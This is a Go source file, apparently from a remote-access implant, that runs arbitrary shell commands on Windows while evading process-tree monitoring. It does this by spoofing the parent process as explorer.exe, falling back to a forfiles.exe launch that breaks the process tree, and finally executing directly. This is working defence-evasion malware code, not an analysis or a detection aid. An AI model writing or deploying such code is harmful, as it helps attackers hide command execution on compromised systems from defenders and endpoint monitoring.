package main

import (
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func execCommand(ctx context.Context, name string, args ...string) *exec.Cmd {
	return exec.CommandContext(ctx, name, args...)
}

// execCommandEvasive runs a command with process-tree evasion on Windows.
// Chain: PPID spoof (under explorer.exe) → forfiles tree break → direct exec.
// Each fallback gets its own timeout so an earlier stage's expiry doesn't
// prevent the next one from running.
func execCommandEvasive(command string) ([]byte, error) {
	if runtime.GOOS == "windows" && skipEvasion != "true" && runtime.GOARCH == "amd64" {
		// PPID spoof first — cmd.exe appears as child of explorer.exe
		ppid := findExplorerPID()
		if ppid != 0 {
			ppidCtx, ppidCancel := context.WithTimeout(context.Background(), 15*time.Second)
			type ppidResult struct {
				out []byte
				err error
			}
			ch := make(chan ppidResult, 1)
			go func() {
				defer func() {
					if rec := recover(); rec != nil {
						ch <- ppidResult{nil, fmt.Errorf("ppid: %v", rec)}
					}
				}()
				o, e := ExecuteWithPPIDSpoof(command, ppid)
				ch <- ppidResult{o, e}
			}()
			select {
			case <-ppidCtx.Done():
			case r := <-ch:
				if r.err == nil && len(r.out) > 0 {
					ppidCancel()
					return r.out, nil
				}
			}
			ppidCancel()
		}

		// Forfiles tree break — cmd.exe spawned by forfiles.exe, not our process
		ffCtx, ffCancel := context.WithTimeout(context.Background(), 15*time.Second)
		out, err := executeViaForfiles(ffCtx, command)
		ffCancel()
		if err == nil && len(out) > 0 {
			return []byte(out), nil
		}
	}

	// Direct exec fallback — always gets a fresh context
	directCtx, directCancel := context.WithTimeout(context.Background(), 25*time.Second)
	defer directCancel()

	if runtime.GOOS == "windows" {
		parts := splitCommand(command)
		if len(parts) > 0 {
			out, err := runCommand(directCtx, parts[0], parts[1:]...)
			if err == nil {
				return out, nil
			}
		}
	}
	return runCommand(directCtx, shellName(), shellFlag(), command)
}

func splitCommand(command string) []string {
	var parts []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)
	for i := 0; i < len(command); i++ {
		c := command[i]
		if !inQuote && (c == '"' || c == '\'') {
			inQuote = true
			quoteChar = c
		} else if inQuote && c == quoteChar {
			inQuote = false
		} else if !inQuote && c == ' ' {
			if current.Len() > 0 {
				parts = append(parts, current.String())
				current.Reset()
			}
		} else {
			current.WriteByte(c)
		}
	}
	if current.Len() > 0 {
		parts = append(parts, current.String())
	}
	return parts
}

func shellName() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	return "sh"
}

func shellFlag() string {
	if runtime.GOOS == "windows" {
		return "/C"
	}
	return "-c"
}
